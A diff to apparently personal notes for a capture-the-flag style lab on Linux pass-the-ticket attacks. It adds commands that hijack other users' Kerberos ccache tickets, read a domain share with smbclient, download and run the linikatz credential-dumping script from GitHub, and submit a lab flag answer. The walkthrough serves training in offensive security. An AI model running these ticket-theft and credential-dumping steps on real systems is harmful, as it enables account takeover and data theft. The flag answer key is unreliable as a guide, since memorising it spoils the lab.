@@ -3038,7 +3038,7 @@ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.
 ### Which group can connect to LINUX01?
 
 ```shell
-real list
+realm list
 ```
 ### Look for a keytab file that you have read and write access. Submit the file name as a response.
 
@@ -3070,3 +3070,22 @@ sudo -l
 sudo su
 ```
 ### Check the /tmp directory and find Julio's Kerberos ticket (ccache file). Import the ticket and read the contents of julio.txt from the domain share folder \\DC01\julio.
+
+```shell
+ls -la /tmp/
+export KRB5CCNAME=/root/krb5cc_647401106_q6Figa
+klist
+
+smbclient //DC01/julio -k -c 'get julio.txt'
+```
+### Use the LINUX01$ Kerberos ticket to read the flag found in \\DC01\linux01. Submit the contents as your response (the flag starts with Us1nG_).
+
+```shell
+wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
+/opt/linikatz.sh
+# we get the path /var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB
+klist
+---
+Us1nG_KeyTab_Like_@_PRO
+```
